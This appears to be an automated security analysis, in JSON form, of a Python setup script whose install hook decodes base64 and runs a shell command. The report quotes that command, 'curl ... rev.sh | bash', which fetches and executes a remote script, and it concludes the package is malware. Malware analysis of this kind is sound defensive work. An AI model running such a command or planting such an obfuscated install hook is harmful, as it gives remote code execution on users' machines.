{
  "purpose": "The code defines a setup script for a Python package, with custom commands that execute additional code during installation or development setup.",
  "sources": "The function notmalfunc() which executes os.system() with a decoded base64 string; the base64 string encodes a URL command.",
  "sinks": "os.system() call executing decoded base64 code, which likely makes an HTTP request.",
  "flows": "During package installation or development setup, notmalfunc() is called, decoding base64 and executing the command via os.system.",
  "anomalies": "Use of base64 encoding for code obfuscation; executing system commands during setup process; no explicit hardcoded credentials, but obfuscated remote URL call is suspicious.",
  "analysis": "The script uses a base64-encoded string that decodes to a shell command: 'curl -s http://localhost:8000/rev.sh | bash'. This command fetches and executes a script from a local server, which is highly suspicious. The command is triggered during 'install' via the AfterInstall class's run() method. The use of base64 encoding indicates an attempt to hide the malicious intent. The script also modifies the setup process with custom commands but primarily to execute remote code upon installation.",
  "conclusion": "The code contains obfuscated malicious behavior that executes a remote script during installation, posing a high security risk. It attempts to fetch and run code from a local server, which could be malicious or harmful. This package should be considered unsafe and potentially malware.",
